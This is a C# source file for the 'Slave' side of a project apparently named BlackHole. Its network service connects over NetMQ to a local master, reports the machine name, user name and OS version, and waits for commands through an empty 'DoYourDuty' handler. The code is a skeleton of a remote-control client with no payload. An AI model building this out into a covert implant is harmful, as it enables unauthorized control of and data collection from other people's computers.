using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using NetMQ;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class NetworkService : Singleton<NetworkService>
    {
        private NetMQContext m_netContext;
        private NetMQSocket m_client;
        private Poller m_poller;

        /// <summary>
        /// 
        /// </summary>
        public void Initialize()
        {
            m_netContext = NetMQContext.Create();
            m_client = m_netContext.CreateDealerSocket();
            m_client.ReceiveReady += Client_ReceiveReady;

            m_client.Connect("tcp://127.0.0.1:5556");
            Send(new GreetTheMaster()
            {
                MachineName = Environment.MachineName,
                UserName = Environment.UserName,
                OperatingSystem = Environment.OSVersion.VersionString
            });

            m_poller = new Poller();
            m_poller.AddSocket(m_client);
            m_poller.PollTillCancelled();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Send(NetMessage message) => m_client.SendMultipartMessage(new NetMQMessage(new byte[][] { message.Serialize() }));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Client_ReceiveReady(object sender, NetMQSocketEventArgs e)
        {
            var frames = e.Socket.ReceiveMultipartMessage();
            var message = NetMessage.Deserialize(frames.Last.Buffer);
            message.Match()
                .With<DoYourDuty>(DoYourDuty);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DoYourDuty(DoYourDuty message)
        {
        }
    }
}
